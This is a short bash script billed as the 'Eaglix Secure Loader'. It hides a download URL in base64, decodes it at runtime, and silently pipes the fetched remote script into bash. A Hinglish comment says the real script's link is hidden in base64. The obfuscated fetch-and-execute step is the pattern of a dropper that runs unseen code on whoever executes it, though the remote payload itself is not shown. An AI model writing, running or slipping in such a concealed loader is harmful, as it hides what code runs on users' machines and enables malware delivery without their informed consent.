#!/usr/bin/env bash
# ==========================================
# Eaglix Secure Loader
# ==========================================
set -euo pipefail

# --- helpers ---
b64d() { printf '%s' "$1" | base64 -d; }

# Eaglix Encrypted Core Link
# Yeh tumhari asli script ki link hai, jo base64 mein chhupi hui hai.
URL_B64="aHR0cHM6Ly9lYWdsaXgtaW5zdGFsbGVyLm5ldGxpZnkuYXBwL2VhZ2xpeC1jb3JlLXNlY3JldC5zaA=="

# Decode the URL
REAL_URL="$(b64d "$URL_B64")"

# Ensure curl exists
if ! command -v curl >/dev/null 2>&1; then
    echo "Error: curl is required but not installed." >&2
    exit 1
fi

# Fetch and execute the main Eaglix script silently
curl -sL "$REAL_URL" | bash
